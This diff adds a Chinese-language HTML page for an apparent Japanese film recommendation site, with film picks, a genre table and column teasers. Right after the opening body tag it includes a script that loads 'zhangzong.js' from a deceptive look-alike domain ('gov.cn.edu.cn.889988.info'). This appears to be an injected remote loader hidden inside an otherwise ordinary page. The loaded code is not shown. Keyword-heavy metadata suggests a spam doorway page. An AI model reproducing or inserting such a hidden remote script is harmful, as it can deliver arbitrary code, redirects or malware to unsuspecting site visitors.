@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>日本情电影网 - 日本剧情片与艺术电影在线观看 | ribenseqingdianyingwang-zh.github.io</title>
+<meta name="keywords" content="日本情电影网,日本剧情电影,日本文艺片,日本爱情电影,日本艺术院线,日本电影资源,和风影展">
+<meta name="description" content="日本情电影网（ribenseqingdianyingwang-zh.github.io）专注日本剧情、文艺与情感题材电影，收录经典佳作与当季新片，提供清晰分类与影片解读，适配手机与电脑浏览。">
+<meta name="author" content="日本情电影网">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<meta name="revisit-after" content="7 days">
+<meta name="applicable-device" content="pc,mobile">
+<meta name="mobile-agent" content="format=html5; url=https://ribenseqingdianyingwang-zh.github.io/">
+<link rel="canonical" href="https://ribenseqingdianyingwang-zh.github.io/">
+<style>
+/* ============ 基础 ============ */
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+font-family:"Hiragino Sans GB","Noto Sans CJK SC","PingFang SC","Microsoft YaHei",sans-serif;
+background:#f7f4f0;color:#2d2824;line-height:1.8;-webkit-text-size-adjust:100%;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1160px;margin:0 auto;padding:0 20px}
+section{padding:52px 0}
+.eyebrow{font-size:12px;letter-spacing:3px;color:#a07855;text-transform:uppercase;margin-bottom:6px}
+.sec-title{font-size:24px;font-weight:800;margin-bottom:8px;color:#3a322b}
+.sec-sub{font-size:14px;color:#8a7f74;margin-bottom:26px}
+
+/* ============ 顶部 ============ */
+.topbar{background:#2d2824;border-bottom:1px solid #3d3630;position:sticky;top:0;z-index:50}
+.topbar .wrap{display:flex;align-items:center;justify-content:space-between;height:60px}
+.logo{display:flex;align-items:baseline;gap:8px;color:#f7f4f0}
+.logo b{font-size:19px;letter-spacing:1px}
+.logo span{font-size:11px;color:#a07855;letter-spacing:1px}
+.menu{display:flex;gap:4px}
+.menu a{padding:8px 14px;border-radius:6px;color:#cfc6bb;font-size:14px;transition:.2s}
+.menu a:hover{background:#4a3f36;color:#fff}
+.menu-btn{display:none;width:40px;height:40px;border:0;background:transparent;color:#fff;font-size:22px;cursor:pointer}
+
+/* ============ 首屏 Hero ============ */
+.hero{background:#3a322b;color:#f7f4f0;padding:70px 0 60px;position:relative;overflow:hidden}
+.hero::after{content:"";position:absolute;right:-80px;top:-60px;width:340px;height:340px;border-radius:50%;background:radial-gradient(circle,rgba(160,120,85,.35),transparent 70%)}
+.hero-grid{display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:center}
+.hero h1{font-size:38px;line-height:1.3;font-weight:800;margin-bottom:18px}
+.hero h1 .accent{color:#d9b382}
+.hero p{color:#d3cbc1;font-size:15px;margin-bottom:24px}
+.hero-stats{display:flex;gap:30px;margin-top:30px}
+.hero-stats div b{display:block;font-size:26px;color:#d9b382;font-weight:800}
+.hero-stats div small{font-size:12px;color:#a89d91}
+.hero-card{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:18px;padding:8px;backdrop-filter:blur(6px)}
+.hero-card .ph{aspect-ratio:4/3;border-radius:12px;background:linear-gradient(135deg,#5c4a3d,#8a6f57);display:grid;place-items:center;font-size:56px}
+.hero-card .txt{padding:14px 12px}
+.hero-card .txt b{font-size:16px;display:block;margin-bottom:4px}
+.hero-card .txt p{font-size:13px;color:#c3bab0;margin:0}
+
+/* ============ 栏目一 选片 ============ */
+.filters{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:22px}
+.filters a{background:#fff;border:1px solid #e2d9cd;padding:6px 16px;border-radius:30px;font-size:13px;color:#6b6157}
+.filters a.on,.filters a:hover{background:#3a322b;color:#fff;border-color:#3a322b}
+.mix{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.mix-item{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 4px 14px rgba(58,50,43,.07)}
+.mix-item .pic{aspect-ratio:5/3;display:grid;place-items:center;font-size:42px;color:#fff}
+.p1{background:linear-gradient(135deg,#7a5c43,#b08d6a)}
+.p2{background:linear-gradient(135deg,#4a5d4e,#7d9a82)}
+.p3{background:linear-gradient(135deg,#6b4a5a,#a07a8c)}
+.p4{background:linear-gradient(135deg,#5c5a7a,#8d8aad)}
+.p5{background:linear-gradient(135deg,#7a6a4a,#b0a07d)}
+.p6{background:linear-gradient(135deg,#4a6a7a,#7da0ad)}
+.mix-item .body{padding:14px 16px}
+.mix-item h3{font-size:16px;margin-bottom:4px}
+.mix-item .meta{font-size:12px;color:#9a8f83}
+.mix-item .meta em{font-style:normal;color:#a07855;margin-left:8px}
+
+/* ============ 栏目二 类型 ============ */
+#cat{background:#fff}
+.cat-table{width:100%;border-collapse:collapse;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 4px 14px rgba(58,50,43,.06)}
+.cat-table th,.cat-table td{padding:15px 18px;text-align:left;border-bottom:1px solid #f0ebe4;font-size:14px}
+.cat-table th{background:#f7f4f0;color:#6b6157;font-size:13px;letter-spacing:1px}
+.cat-table td a{color:#a07855;font-weight:600}
+.cat-table tr:hover td{background:#fdfbf8}
+
+/* ============ 栏目三 放映厅 ============ */
+#show{background:#3a322b;color:#f7f4f0}
+#show .sec-title{color:#fff}
+#show .sec-sub{color:#b0a696}
+.screen-wrap{display:grid;grid-template-columns:1.3fr 1fr;gap:24px}
+.screen{background:linear-gradient(135deg,#4a3f36,#5c4f44);border-radius:16px;padding:26px}
+.screen .big{aspect-ratio:16/9;border-radius:10px;background:#2d2824;display:grid;place-items:center;font-size:64px;margin-bottom:18px}
+.screen h3{font-size:19px;margin-bottom:8px}
+.screen p{font-size:13.5px;color:#cfc6bb}
+.screen .go{display:inline-block;margin-top:16px;background:#a07855;color:#fff;padding:9px 22px;border-radius:8px;font-size:14px;font-weight:600}
+.plist{display:flex;flex-direction:column;gap:10px}
+.plist .p{display:flex;gap:12px;background:rgba(255,255,255,.06);border-radius:12px;padding:10px;align-items:center}
+.plist .p .n{width:28px;height:28px;border-radius:50%;background:#a07855;color:#fff;display:grid;place-items:center;font-size:13px;flex-shrink:0}
+.plist .p b{font-size:14px;flex:1}
+.plist .p span{font-size:12px;color:#a89d91}
+
+/* ============ 栏目四 专栏 ============ */
+.notes{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+.note{background:#fff;border-left:4px solid #a07855;border-radius:10px;padding:18px 20px}
+.note .tag{font-size:11px;color:#a07855;letter-spacing:1px;margin-bottom:6px}
+.note h3{font-size:16px;margin-bottom:8px}
+.note p{font-size:13.5px;color:#7a6f63}
+.note .more{display:inline-block;margin-top:10px;font-size:13px;color:#a07855;font-weight:600}
+
+/* ============ 页脚 ============ */
+footer{background:#23201d;color:#a89d91;padding:46px 0 30px;font-size:13.5px}
+.foot{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:30px;margin-bottom:28px}
+.foot h4{color:#f7f4f0;font-size:14px;margin-bottom:12px}
+.foot ul li{margin-bottom:8px}
+.foot a:hover{color:#fff}
+.foot-bot{border-top:1px solid #35302b;padding-top:20px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px}
+.foot-bot .site{color:#d9b382}
+.foot-bot a{margin-left:18px;color:#8a7f74}
+
+/* ============ 响应式 ============ */
+@media(max-width:900px){
+.hero-grid,.screen-wrap{grid-template-columns:1fr;gap:30px}
+.mix{grid-template-columns:repeat(2,1fr)}
+.notes{grid-template-columns:1fr}
+.hero h1{font-size:30px}
+}
+@media(max-width:640px){
+.wrap{padding:0 15px}
+.menu{display:none;position:absolute;top:60px;left:0;right:0;background:#2d2824;flex-direction:column;padding:10px}
+.menu.open{display:flex}
+.menu-btn{display:block}
+section{padding:36px 0}
+.hero{padding:44px 0 38px}
+.hero h1{font-size:24px}
+.hero-stats{gap:20px}
+.mix{grid-template-columns:1fr}
+.cat-table th,.cat-table td{padding:12px 10px;font-size:13px}
+.foot{grid-template-columns:1fr 1fr;gap:20px}
+.foot-bot{flex-direction:column}
+.foot-bot a{margin-left:0;margin-right:16px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- 顶部 -->
+<div class="topbar">
+  <div class="wrap">
+    <div class="logo"><b>日本情电影网</b><span>RIBENSEQING</span></div>
+    <button class="menu-btn" onclick="document.getElementById('nav').classList.toggle('open')">☰</button>
+    <nav class="menu" id="nav">
+      <a href="#pick">选片</a>
+      <a href="#cat">类型</a>
+      <a href="#show">放映厅</a>
+      <a href="#note">专栏</a>
+      <a href="#link">友情链接</a>
+    </nav>
+  </div>
+</div>
+
+<!-- 首屏 -->
+<div class="hero">
+  <div class="wrap">
+    <div class="hero-grid">
+      <div>
+        <div class="eyebrow">Japanese Cinema Online</div>
+        <h1>慢下来，<br>看一部<span class="accent">有情绪的日本电影</span></h1>
+        <p>从是枝裕和式家庭叙事到森田芳光的都市情感，从昭和老片到当季新作，日本情电影网按情绪与题材帮你选片，不止是片名列表。</p>
+        <div class="hero-stats">
+          <div><b>3200+</b><small>收录影片</small></div>
+          <div><b>26</b><small>题材分类</small></div>
+          <div><b>每日</b><small>更新片单</small></div>
+        </div>
+      </div>
+      <div class="hero-card">
+        <div class="ph">🌸</div>
+        <div class="txt">
+          <b>本周编辑之选 ·《花束般的恋爱》</b>
+          <p>都市青年的爱情从契合到走散，一部属于当下的日本情感写实片。</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- 栏目一 选片 -->
+<section id="pick">
+  <div class="wrap">
+    <div class="eyebrow">Editor's Pick</div>
+    <h2 class="sec-title">编辑选片</h2>
+    <p class="sec-sub">每周由编辑团队按题材与情绪筛选，覆盖剧情、爱情、家庭、时代剧等多个方向。</p>
+    <div class="filters">
+      <a href="#" class="on">全部</a>
+      <a href="#">剧情</a>
+      <a href="#">爱情</a>
+      <a href="#">家庭</a>
+      <a href="#">青春</a>
+      <a href="#">时代剧</a>
+      <a href="#">治愈</a>
+    </div>
+    <div class="mix">
+      <article class="mix-item">
+        <div class="pic p1">🎎</div>
+        <div class="body"><h3>秋刀鱼之味</h3><div class="meta">家庭 / 1962<em>豆瓣 9.1</em></div></div>
+      </article>
+      <article class="mix-item">
+        <div class="pic p2">🍃</div>
+        <div class="body"><h3>小森林 夏秋篇</h3><div class="meta">治愈 / 2014<em>豆瓣 9.0</em></div></div>
+      </article>
+      <article class="mix-item">
+        <div class="pic p3">🌙</div>
+        <div class="body"><h3>夜以继日</h3><div class="meta">爱情 / 2018<em>豆瓣 7.9</em></div></div>
+      </article>
+      <article class="mix-item">
+        <div class="pic p4">🚄</div>
+        <div class="body"><h3>情书</h3><div class="meta">青春 / 1995<em>豆瓣 8.9</em></div></div>
+      </article>
+      <article class="mix-item">
+        <div class="pic p5">🏮</div>
+        <div class="body"><h3>楢山节考</h3><div class="meta">时代 / 1983<em>豆瓣 9.0</em></div></div>
+      </article>
+      <article class="mix-item">
+        <div class="pic p6">☔</div>
+        <div class="body"><h3>无人知晓</h3><div class="meta">剧情 / 2004<em>豆瓣 9.1</em></div></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二 类型 -->
+<section id="cat">
+  <div class="wrap">
+    <div class="eyebrow">Browse by Genre</div>
+    <h2 class="sec-title">题材分类索引</h2>
+    <p class="sec-sub">按题材与年代双维度整理，方便按心情和时段选片。</p>
+    <table class="cat-table">
+      <thead>
+        <tr><th>题材</th><th>代表影片</th><th>年代</th><th>情绪标签</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><a href="#">家庭伦理</a></td><td>如父如子 / 步履不停</td><td>2008–2013</td><td>温情 · 反思</td></tr>
+        <tr><td><a href="#">都市爱情</a></td><td>花束般的恋爱 / 明日的我与昨日的你约会</td><td>2017–2021</td><td>甜蜜 · 遗憾</td></tr>
+        <tr><td><a href="#">青春成长</a></td><td>热血高校 / 关于莉莉周的一切</td><td>2001–2007</td><td>躁动 · 纯真</td></tr>
+        <tr><td><a href="#">时代剧</a></td><td>壬生义士传 / 蝉时雨</td><td>2005–2006</td><td>苍凉 · 侠义</td></tr>
+        <tr><td><a href="#">治愈生活</a></td><td>小森林 / 海街日记</td><td>2014–2015</td><td>松弛 · 温暖</td></tr>
+        <tr><td><a href="#">悬疑剧情</a></td><td>白夜行 / 嫌疑人X的献身</td><td>2006–2008</td><td>压抑 · 反转</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- 栏目三 放映厅 -->
+<section id="show">
+  <div class="wrap">
+    <div class="eyebrow">Screening Room</div>
+    <h2 class="sec-title">今日放映厅</h2>
+    <p class="sec-sub">每日轮换三部主题影片，附编辑短评与观看建议。</p>
+    <div class="screen-wrap">
+      <div class="screen">
+        <div class="big">🎌</div>
+        <h3>今日主打：《濑户内海时间》</h3>
+        <p>以濑户内海的岛屿为背景，讲述返乡青年与故乡之间的微妙拉扯。节奏舒缓，适合周末午后观看，建议搭配片尾字幕听完最后的配乐。</p>
+        <a class="go" href="#">进入放映 ›</a>
+      </div>
+      <div class="plist">
+        <div class="p"><span class="n">1</span><b>海街日记</b><span>126 min</span></div>
+        <div class="p"><span class="n">2</span><b>比海更深</b><span>117 min</span></div>
+        <div class="p"><span class="n">3</span><b>小偷家族</b><span>121 min</span></div>
+        <div class="p"><span class="n">4</span><b>驾驶我的车</b><span>179 min</span></div>
+        <div class="p"><span class="n">5</span><b>偶然与想象</b><span>121 min</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四 专栏 -->
+<section id="note">
+  <div class="wrap">
+    <div class="eyebrow">Film Notes</div>
+    <h2 class="sec-title">观影笔记专栏</h2>
+    <p class="sec-sub">不定期更新的选片思路、导演脉络与观影建议。</p>
+    <div class="notes">
+      <article class="note">
+        <div class="tag">导演脉络</div>
+        <h3>是枝裕和的家庭观：从《幻之光》到《怪物》</h3>
+        <p>梳理是枝裕和三十年来对家庭关系的反复追问，理解他为何总把镜头对准"非典型家庭"。</p>
+        <a class="more" href="#">阅读全文 ›</a>
+      </article>
+      <article class="note">
+        <div class="tag">选片方法</div>
+        <h3>心情不好时该看哪类日本电影？</h3>
+        <p>按情绪状态推荐对应题材，附五部治愈系影片与两部需要慎看的沉重之作。</p>
+        <a class="more" href="#">阅读全文 ›</a>
+      </article>
+      <article class="note">
+        <div class="tag">片单</div>
+        <h3>豆瓣 9 分以上的十部日本老片</h3>
+        <p>从黑泽明到小津安二郎，跨越半个世纪的十部高分作品，附观看顺序建议。</p>
+        <a class="more" href="#">阅读全文 ›</a>
+      </article>
+      <article class="note">
+        <div class="tag">行业</div>
+        <h3>2026 日本电影市场观察</h3>
+        <p>当季新片上映节奏、本土票房表现与值得关注的新人导演作品盘点。</p>
+        <a class="more" href="#">阅读全文 ›</a>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer id="link">
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <h4>日本情电影网</h4>
+        <p>专注日本剧情、文艺与情感题材电影的选片平台，提供分类索引、编辑选片与观影笔记，帮助观众在海量片源中快速找到值得一看的作品。</p>
+      </div>
+      <div>
+        <h4>站点栏目</h4>
+        <ul>
+          <li><a href="#pick">编辑选片</a></li>
+          <li><a href="#cat">题材分类</a></li>
+          <li><a href="#show">今日放映厅</a></li>
+          <li><a href="#note">观影笔记</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>快速选片</h4>
+        <ul>
+          <li><a href="#">家庭伦理片</a></li>
+          <li><a href="#">都市爱情片</a></li>
+          <li><a href="#">治愈生活片</a></li>
+          <li><a href="#">经典老片</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>关于本站</h4>
+        <ul>
+          <li><a href="#">网站说明</a></li>
+          <li><a href="#">更新日志</a></li>
+          <li><a href="#">意见反馈</a></li>
+          <li><a href="#">免责声明</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-bot">
+      <span class="site">网站网址：https://ribenseqingdianyingwang-zh.github.io</span>
+      <span>
+        <a href="#">友情链接</a>
+        <a href="#">隐私政策</a>
+        <a href="#">回到顶部</a>
+      </span>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
